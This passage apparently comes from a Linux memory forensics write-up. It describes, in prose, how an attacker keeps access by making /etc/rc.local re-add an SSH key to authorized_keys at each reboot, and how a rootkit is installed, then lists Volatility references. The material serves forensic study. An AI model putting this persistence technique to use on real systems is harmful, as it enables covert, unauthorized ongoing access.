* The attacker edits the `/etc/rc.local` file in order to add a script which will add their public key to the SSH `authorized_keys` file, allowing them to maintain access. So even if the victim notices the key added to the `authorized_keys` file & deletes it, once the machine reboots, it'll be re-added.
  
* The attacker installs a rootkit
  

## References

* https://forensecurity.blogspot.com/2013/12/analyzing-linux-memory-dumps-with.html
* https://code.google.com/archive/p/volatility/wikis/LinuxMemoryForensics.wiki
* https://volatility3.readthedocs.io/en/latest/volatility3.plugins.linux.html
* https://www.geeksforgeeks.org/insmod-command-in-linux-with-examples/
* https://stuxnet999.github.io/dfir/2020/09/20/Linux-Memory-Forensics.html
* https://vdocuments.net/omfw-2012-analyzing-linux-kernel-rootkits-with-volatlity.html
* https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference
* https://themalhunt.wordpress.com/2020/07/21/introduction-to-volatility-for-hunting-malware-in-memory-dumps/
* https://forensecurity.blogspot.com/2013/12/analyzing-linux-memory-dumps-with.html
* https://andreafortuna.org/2019/08/22/how-to-generate-a-volatility-profile-for-a-linux-system/
